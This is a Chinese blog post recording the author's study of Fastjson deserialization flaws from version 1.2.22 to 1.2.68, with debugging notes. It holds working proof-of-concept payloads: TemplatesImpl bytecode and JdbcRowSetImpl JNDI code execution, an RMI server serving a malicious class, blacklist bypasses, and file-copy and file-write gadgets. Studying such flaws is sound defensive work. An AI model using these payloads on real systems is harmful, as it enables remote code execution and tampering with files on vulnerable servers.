---
title: fastjson反序列化漏洞学习记录
date: 2022-06-06 21:14:23
tags:
      - fastjson
      - 反序列化
categories: java
---

Fastjson是阿里开发的一个Java库, 提供了将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效类<!--more-->

### 原理

Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制会调用指定类中的setter方法及部分getter方法，当组件开启了autotype功能并且反序列化不可信数据时（后边即使不开也没用，除非启用safemode），攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有gadget，则会造成一些严重的安全问题。

例子

```java
package com.test;
import com.alibaba.fastjson.JSON;
import java.io.IOException;
class POC {
    public POC() {
        System.out.println("无参构造方法调用");
    }
    public POC(String cmd) {
        this.cmd = cmd;
    }
    public String getCmd() {
        System.out.println("get调用");
        return cmd;
    }
    public void setCmd(String cmd) {
        System.out.println("set调用");
        this.cmd = cmd;
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private String cmd;
//1.2.22 - 1.2.24
}
public class test {
    public static void main(String[] args) {
        POC poc = new POC("calc");
        String s = JSON.toJSONString(poc);
        System.out.println(s);
        JSON.parseObject("{\"@type\":\"com.test.POC\",\"cmd\":\"calc\"}");
    }
}

```

![image-20220606212042046](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220606212042046.png)

可以看到,序列化的时候调用了get,反序列化的时候调用了无参构造方法,set和get方法

## 漏洞历史分析

## 1.2.22 - 1.2.24

跟着源码调试了一下,大体流程就是对字符串做语法分析,拆分开,并且对每个属性用fieldInfo进行存储,最后使用反射调用它对应的set方法,这个set方法名是字符串拼接的,不难让人想到TemplatesImpl这个类,这个类有一个`getOutputProperties()`方法

但是有个问题就是这个类中的所有属性都是私有属性,需要添加`Feature.SupportNonPublicField`字段才能通过`JSON.parseObject`进行字符串到对象的转换过程

#### TemplatesImpl调用链

```java
TemplatesImpl.getOutputProperties()
   TemplatesImpl.newTransformer()
      TemplatesImpl.getTransletInstance()
         TemplatesImpl.defineTransletClasses()
            ClassLoader.defineClass()
               Class.newInstance()
```

最主要的地方就是构造TemplatesImpl类中的`_bytecode`属性

这个地方可以使用反射构造继承了`AbstractTranslet`的恶意类来执行代码

恶意代码可以添加在恶意类的静态代码块在类加载的时候执行或者添加到它的构造方法中在实例化的时候调用

学习一下使用`javassist`这个工具来生成一个类并修改代码生成字节码

```java
package com.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

public class fastJson {
public static class evil{  
}
    public static void main(String[] args)throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.get(evil.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        evil.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "test";
        evil.setName(randomClassName);
        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] evilCode = evil.toBytecode();
        String evilCode_base64 = Base64.encodeBase64String(evilCode);
        final String Template = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload =
                "{\"" +
                        "@type\":\"" + Template + "\"," + "\"" +
                        "_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                        "'_name':'asd','" +
                        "_tfactory':{ },\"" +
                        "_outputProperties\":{ }," + "\"" +
                        "_version\":\"1.0\",\"" +
                        "allowedProtocols\":\"all\"}\n";
        ParserConfig config = new ParserConfig();
        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);
        System.out.println(obj);
    }
}
```

##### 为什么类需要是public的

值得一提的是这里的恶意类必须是public的,否则在`TemplatesImpl`类中的`getTransletInstance`方法中会无法获取该类的实例

```java
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

![image-20220607213128139](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607213128139.png)

根本原因在`Class.newInstance`的调用链这里

按理说我定义的类的包和它就是一致的呀,明明代码都写在一个包下面,但是根据调试发现,javassist生成的class它是不带包名的

![image-20220607221426566](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607221426566.png)

所以这个判断的地方输出false,而只有它的修饰符是public才能进入下面的代码并且返回true最后实现实例化

![image-20220607220335886](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607220335886.png)

![image-20220607220315641](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607220315641.png)

这里对于利用条件是有要求的，Fastjson默认只会反序列化public属性，而outputProperties和_bytecodes由private修饰，所以受害端的parseObject必须设置Feature.portNonPublicField，而Feature.portNonPublicField在1.22才被引入，所以这条利用链条件过于苛刻

#### JdbcRowSetImpl调用链

![image-20220608005810266](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608005810266.png)

在`JdbcRowSetImpl#connect`方法中调用了参数名可控的`InitialContext.lookup()`方法

这里有一个基础知识点,就是子类虽然可以继承父类的private属性,但是**必须通过父类中定义的get和set才能访问到**

![image-20220608005043003](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608005043003.png)

共有三处调用了`connect()`方法

里面第三个`setAutoCommit`方法对应的参数`autoCommit`同时拥有get方法,可以使用fastjson还原类的时候调用set方法的特性从而调用到`lookup`

编写恶意服务端

```java
public class Server {
    public static void main(String[] args) throws Exception{
        //第一个参数随便填
        Reference reference=new Reference("evil","evil","http://127.0.0.1:5555/");
        //这里末尾要加个/,否则无法读取.....
        //将该reference封装成远程对象
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        LocateRegistry.createRegistry(1099);
        Naming.bind("hello",referenceWrapper);
    }
}
```

开启http服务并将静态代码块有恶意代码的恶意类放上去

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220608011811781.png" alt="image-20220608011811781" style="zoom:67%;" />

exp

```java
public static void main(String[] args) {
        JSON.parseObject("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\"autoCommit\":true}");
}

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/hello","autoCommit":true}
```



## 1.2.25-1.2.41

1.2.25开始引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测，所以1.2.25~1.2.24的关键就在于**针对开启了Autotype的Fastjson进行黑名单绕过**

黑名单的实现在`com.alibaba.fastjson.parser.ParserConfig`的`denyList`属性中

![image-20220607234636647](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220607234636647.png)

##### checkAutoType函数分析

如果能直接添加到白名单中也就不需要下面的绕过了

首先需要打开autoType才能进行对不在白名单中的类型进行转换

其中一种方便调试的最简单的方式是设置全局`ParserConfig`的`AutoTypeSupport`为true

开启之后让autoTypeSupport为true才能有机会进去这段代码

![image-20220609204549908](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220609204549908.png)

在这段代码中判断,如果在白名单`acceptList`中则调用`TypeUtils.loadClass`,不在白名单里面进入下面是否在黑名单中的判断,如果不在黑名单才能接着往下走

直到源码的861行,调用`TypeUtils.loadClass`去加载类

![image-20220610152821158](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610152821158.png)

这个loadClass方法会将以L开头和;结尾的类名去除L和;再去递归调用加载

![image-20220610152802367](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610152802367.png)

这里涉及到一个叫做JNI字段描述符的东西

JNI全称是(Java Native Interface)

https://blog.csdn.net/m0_37537867/article/details/124137225

它提供一种Java字节码调用c/c++的解决方案

由于Java支持函数重载，因此仅仅根据函数名是没法找到对应的JNI函数。为了解决这个问题，JNI将参数类型和返回值类型作为函数的签名信息。

![image-20220610162925861](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610162925861.png)

**JNI常用的数据类型及对应字符**

| Java 类型   | 符号                                                         |
| ----------- | ------------------------------------------------------------ |
| Boolean     | Z                                                            |
| Byte        | B                                                            |
| Char        | C                                                            |
| Short       | S                                                            |
| Int         | I                                                            |
| Long        | J                                                            |
| Float       | F                                                            |
| Double      | D                                                            |
| Void        | V                                                            |
| objects对象 | 以"`L`“开头，以”`;`“结尾，中间是用”`/`" 隔开的包及类名。比如：`Ljava/lang/String;`如果是嵌套类，则用`$`来表示嵌套。例如 “`(Ljava/lang/String;Landroid/os/FileUtils$FileStatus;)Z`” |

##### 总结

综合以上条件,需要开启autoTypeSupport并且将类名进行简单改造,给类名添加`L`和`;`包裹

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject("{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\"autoCommit\":true}");

```

## <=1.2.42

1.2.42版本将黑名单进行了hash处理

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610190544304.png" alt="image-20220610190544304" style="zoom:80%;" />

在checkAutoType函数中

先进行一次判断并截取掉了L和;

![image-20220610223234128](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223234128.png)

接下来的代码就是之前检查黑白名单的hash版

![image-20220610223337297](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223337297.png)

到loadClass这里还是递归调用

![image-20220610223441375](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610223441375.png)

综上所述,可以使用双写L和;的方式绕过

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject("{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\"autoCommit\":true}");
```

## <=1.2.43

该版本对于双写LL的poc进行了判断和限制

![image-20220610231237572](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220610231237572.png)



```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
JSON.parseObject({"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://127.0.0.1:1099/hello","autoCommit":true}");
```

但是可以通过添加`[`和`[{`的方式来进行绕过,添加`[`可以理解,但是添加`[{`还不甚了解

原因是为了让这个地方的token=14从而绕过数组转换抛出异常

关于fastjson中token的解析https://blog.csdn.net/qq_45854465/article/details/120626835

![image-20220611160647239](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611160647239.png)

## <=1.2.45

出现了新的利用类直接绕过了黑名单限制`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`

> 但是mybatis版本必须小于3.5.6

该类中的`setProperties()`方法存在Jndi注入的问题

![image-20220611174720213](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611174720213.png)

新建一个LDAP服务,并且将远程对象引用绑定上去

![image-20220611170739137](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611170739137.png)

写段代码测试一下

![image-20220611174751726](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220611174751726.png)

利用fastjson构造

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
JSON.parseObject("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:10389/cn=test,dc=example,dc=com\"}}");
```

## **<=1.2.47**   ---(无需AutoTypeSupport)

这个版本之前的漏洞都必须要在开启 AutoTypeSupport 的情况下才能利用。由于fastjson会将一些基本类型的类对象提前放到mappings中缓存，通过类缓存机制可以绕过黑白名单检测该版本中，通过利用类缓存机制（通过java.lang.Class类提前带入恶意类并缓存到 TypeUtils.mappings 中），可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。（漏洞点在 checkAutoType 中）

##### poc

```java
JSON.parseObject("[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:10389/cn=test,dc=example,dc=com","autoCommit":true}]");
```

默认使用的是`DefaultJSONParser.parser`

![image-20220614181358097](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614181358097.png)

使用lexer这个词法分析器检测到`@type`之后,会调用`checkAutoType`

![image-20220614181943820](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614181943820.png)

主要的点还是在`checkAutoType`中

![image-20220614185549671](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614185549671.png)

经过前面对poc的基础判断之后,会进入`deserializers.findClass`,这里实际上是去一个桶里面找有没有对应的类,如果类名equal则返回这个类

![image-20220614183113141](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614183113141.png)

桶里面存了一堆类

![image-20220614185937978](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614185937978.png)

获取到java.long.Class类之后会返回到

DefaultJSONParser中继续执行

获取到`MiscCodec`这个类之后,调用`deserialize`方法

![image-20220614190503311](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614190503311.png)

在这个方法中,获取到了val对应的值`com.sun.rowset.JdbcRowSetImpl`

并且在这个if中进行了类加载

![image-20220614191433526](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614191433526.png)

![image-20220614192231949](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614192231949.png)

![image-20220614192924962](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614192924962.png)

这里的第三个参数`cache`为`true`很重要,这样加载完的类就会存储到之前的`mapping`中,此时`com.sun.rowset.JdbcRowSetImpl`就存储在了`getClassFromMapping`这个方法对应的`mapping`中

接下来继续解析字符串,检测到左侧大括号,调用`paseObject`,实际上还是调用的`DefaultJSONParser#parseObject`

![image-20220614193252144](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614193252144.png)

继续到`checkAutoType`的时候,就可以直接从这里获取到`com.sun.rowset.JdbcRowSetImpl`类了

![image-20220614193532234](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220614193532234.png)

走的这个if还不需要开启`AutoType`从而绕过了checkAutoType

## <=1.2.68

[参考](https://blog.csdn.net/mole_exp/article/details/122315526)

但是该漏洞再次实现了在autoType关闭的情况下绕过了`ParserConfig#checkAutoType()`的安全检测。但具体的漏洞利用的危害程度要取决于目标服务的环境（这一点后面会说到），换言之，漏洞利用并不能做到非常通用，因此漏洞的严重性要稍逊于`<= 1.2.47` 版本的那个漏洞。

通过`public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features)`的代码可知，**如果同时符合以下条件，则可以在autoType关闭的情况下，绕过`ParserConfig#checkAutoType()`的安全校验，从而反序列化指定类**：

- (1) `expectClass`不为`null`，且不等于`Object.class`、`Serializable.class`、`Cloneable.class`、`Closeable.class`、`EventListener.class`、`Iterable.class`、`Collection.class`;
- (2) `expectClass`需要在缓存集合`TypeUtils#mappings`中；
- (3) `expectClass`和`typeName`都不在黑名单中；
- (4) `typeName`不是`ClassLoader`、`DataSource`、`RowSet`的子类；
- (5) `typeName`是`expectClass`的子类。(isAssignableFrom()方法判断是否为父类)

>另外，在`1.2.68`版本开始，新增了`safeMode`加固模式。配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。但该模式默认是不开启的。所以不会影响该漏洞的执行流。
>该模式的校验判断也是在`ParserConfig#checkAutoType()`方法中。



大多数时候调用`ParserConfig#checkAutoType()` 进行安全校验时，参数`expectClass`的位置传入的都是`null`。

![image-20220615153348640](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615153348640.png)

有两个反序列化器的地方调用了传递expectClass的`checkAutoType`方法



###  Throwable

##### CalcException

```java
package com.test;
import java.io.IOException;
public class CalcException extends Exception {
    private String command;
    public void setCommand(String command) {
        this.command = command;
    }
    @Override
    public String getMessage() {
        try {
            Runtime.getRuntime().exec(this.command);
        } catch (IOException e) {
            return e.getMessage();
        }
        return super.getMessage();
    }
}
```

##### 循环引用

fastjson支持[循环引用](https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8)，并且是缺省打开的。

通过循环引用,我们就可以使用`$ref`去引用指定对象的某个`xxx`属性，从而访问该对象的`getXXX()`方法

| 语法                             | 描述               |
| -------------------------------- | ------------------ |
| {"$ref":"$"}                     | 引用根对象         |
| {"$ref":"@"}                     | 引用自己           |
| {"$ref":".."}                    | 引用父对象         |
| {"$ref":"../.."}                 | 引用父对象的父对象 |
| {"$ref":"$.members[0].reportTo"} | 基于路径的引用     |

##### poc

这个poc本质上可以理解为一个对象里面有两个成员对象x和y

```json
{"x":
	{"@type":"java.lang.Exception",
	 "@type":"com.test.CalcException", 
	         "command":"calc"}, 
 "y":{"$ref":"$x.message"}
 }
```

在fastjson中，在对某个类型反序列化前，先要进行一次`ParserConfig#checkAutoType()`检查，然后才是获取相应类型的反序列化器进行反序列化。

![image-20220615210559920](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615210559920.png)

在它的反序列化器`ThrowableDeserializer`里面继续进行词法分析

检测到`@type`之后,就调用到了`expectClass`为`Throwable.class`的`checkAutoType方法`

![image-20220615210807185](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615210807185.png)

在这次的checkAutoType方法调用中会走到这里,并且返回`CalcException.class`给`exClass`

![image-20220615211602310](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615211602310.png)

最后在这里创建这个自定义的异常类,虽然报了一个由于没有toString方法导致的异常,但是并不影响后面setValue

![image-20220615212234939](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615212234939.png)

最终在setValue这里调用set方法实现set方法调用由于循环引用调用到getMessage从而弹出计算器

![image-20220615212151886](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615212151886.png)

虽然Throwable这个点可以利用,但是实际环境中的异常类很少有比较危险的set或者get方法

#### 依赖selenium的信息泄露gadget

```xml
<dependency>
  <groupId>org.seleniumhq.selenium</groupId>
  <artifactId>selenium-api</artifactId>
  <version>4.1.1</version>
</dependency>
```

这个gadget需要目标环境引入selenium依赖

其中，org.openqa.selenium.WebDriverException类的getMessage()方法和getSystemInformation()方法都能获取一些系统信息，比如：IP地址、主机名、系统架构、系统名称、系统版本、JDK版本、selenium webdriver版本。另外，还可通过getStackTrace()来获取函数调用栈，从而获悉使用了什么框架或组件。
原理和上面的Throwable一样

```json
{"x":
  {"@type":"java.lang.Exception",
  "@type":"org.openqa.selenium.WebDriverException"},
 "y":{"$ref":"$x.systemInformation"}
}
```

但是`getSystemInformation()`本身是不回显的

### AutoCloseable

接着来看`JavaBeanDeserializer#deserialze()`。

原理上，它跟ThrowableDeserializer#deserialze() 这个利用点是一样的，也是通过利用期望类expectClass去绕过`checkAutoType()`的安全校验。区别在于`JavaBeanDeserializer#deserialze()`中的expectClass参数是用户可控的，所以漏洞利用可发挥的空间更大。
为什么要选择这个接口,其一是因为这个接口和Throwable一样在`TypeUtils#mapping`中,其二是实现了这个接口的一些类往往和流有关,可能可以操作文件

![image-20220623191250838](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623191250838.png)



fastJson选取构造方法的坑

fastjson在调用`JavaBeanDeserializer#deserialze()`进行反序列化的过程中，会去寻找目标类的`public`类型的构造方法：**如果存在无参构造方法，则将其作为构造方法供后续实例化使用；否则使用参数数量最多且排在最前面的构造方法。**

根据上面这条规则,使用的是划红线的构造方法,所以在提供参数的时候需要再多提供一个`append`

![image-20220623202904340](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623202904340.png)

##### java.io.FileOutputStream

**这个点只能在jdk11+之后才能利用**

为什么这个点只能在jdk11之后才能使用?

[原文地址](https://blog.csdn.net/qq_36869808/article/details/123716714)

fastjson 在通过带参构造函数进行[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可。只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有。

![image-20220623230704398](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623230704398.png)

使用`javap -l java.io.FileOutputStream`显示出行号和本地变量表

分别使用jdk11和jdk1.8执行

![image-20220623230339199](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623230339199.png)

可以明显看出,jdk11的字节码存储了参数的名字,而jdk8只会使用var0,var1这样的符号来表示,也就是说fastjson读取不到参数名

这一点也可以在查看.calss文件的时候体现出来,jdk11的字节码中变量不是使用var0这样的东西来替代的,用得是自己本来的名字

>LocalVariableTable该属性的作用是描述帧栈中局部变量与源码中定义的变量之间的关系。可以使用 -g:none 或
>-g:vars来取消或生成这项信息，如果没有生成这项信息，那么当别人引用这个方法时，将无法获取到参数名称，取而代之的是arg0, arg1这样的占位符。start
>表示该局部变量在哪一行开始可见，length表示可见行数，Slot代表所在帧栈位置，Name是变量名称，然后是类型签名。





```json
{
"@type": "java.lang.AutoCloseable",
"@type": "java.io.FileOutputStream",
  "file": "C:/temp/test2.txt",
  "append": "false"
}
```

##### gadget1 复制文件

```xml
<dependency>
   <groupId>org.aspectj</groupId>
   <artifactId>aspectjtools</artifactId>
   <version>1.9.5</version>
</dependency>
```

这个依赖中有一个类`org.eclipse.core.internal.localstore.SafeFileOutputStream`

它的构造方法当`targetPath`不存在且`tempPath`存在时，便会进行文件复制

![image-20220623235104501](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623235104501.png)

poc

```java
{
    "@type":"java.lang.AutoCloseable",
    "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",
    "targetPath":"C:/temp/test2.txt",
    "tempPath":"C:/windows/setupact.log"
}
```

##### gadget2 写文件

```xml
<dependency>
   <groupId>org.aspectj</groupId>
   <artifactId>aspectjtools</artifactId>
   <version>1.9.5</version>
</dependency>
<dependency>
   <groupId>com.esotericsoftware</groupId>
   <artifactId>kryo</artifactId>
   <version>4.0.0</version>
</dependency>
<dependency>
   <groupId>com.sleepycat</groupId>
   <artifactId>je</artifactId>
   <version>18.3.12</version>
</dependency>
```

poc

```json
{
    'stream':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
        'targetPath':'/tmp/dst',
        'tempPath':'/tmp/src'
    },
    'writer':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'com.esotericsoftware.kryo.io.Output',
        'buffer':'aGFja2VkIGJ5IG0wMWUu',
        'outputStream':
        {
            '$ref':'$.stream'
        },
        'position':15
    },
    'close':
    {
        '@type':"java.lang.AutoCloseable",
        '@type':'com.sleepycat.bind.serial.SerialOutput',
        'out':
        {
            '$ref':'$.writer'
        }
    }
}
```

总体来说是一个循环引用的嵌套

(1) 首先通过`org.eclipse.core.internal.localstore.SafeFileOutputStream`的构造方法创建一个输出流对象，并通过参数去指定目标路径/tmp/dst;
(2) 然后通过`com.esotericsoftware.kryo.io.Output`的无参构造方法创建输出流对象，并通过setter方法将自身的输出流指向SafeFileOutputStream输出流对象，且通过setter方法往自身缓冲区填充要写入的数据；
(3) 最后，再通过`com.sleepycat.bind.serial.SerialOutput`的构造方法创建输出流对象，并通过参数将输出流指向(2)创建的Output对象；同时在`com.sleepycat.bind.serial.SerialOutput`构造方法调用的过程中，会调用`com.esotericsoftware.kryo.io.Output#flush()`方法，将buffer缓冲区的数据写入到目标文件/tmp/dst。

##### gadget3 写文件(jdk)

这是 @rmb122发现的一个仅依赖于JDK的写文件gadget，尽管如此，前面也提到了，成功与否取决于目标程序的JDK是否带调试信息。

```json
{
    '@type':"java.lang.AutoCloseable",
    '@type':'sun.rmi.server.MarshalOutputStream',
    'out':
    {
        '@type':'java.util.zip.InflaterOutputStream',
        'out':
        {
           '@type':'java.io.FileOutputStream',
           'file':'C:/temp/test.txt',
           'append':false
        },
        'infl':
        {
            '@type':'java.util.zip.Inflater'
            'input':
            {
                'array':'eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=',
                'limit':65
            }
        },
        'bufLen':1048576
    },
    'protocolVersion':1
}
```

后面加不加@type都可以写文件,这个点值得研究一下





## 总结

在学习代码审计的过程中,由于有的使用了fastjson组件从而接触到了fastjson反序列化漏洞,所以根据网络上的文章,大体将每个版本漏洞的产生原理跟着学习了一下,由于水平不足,不能做出一些延伸和思考,后序内容再补
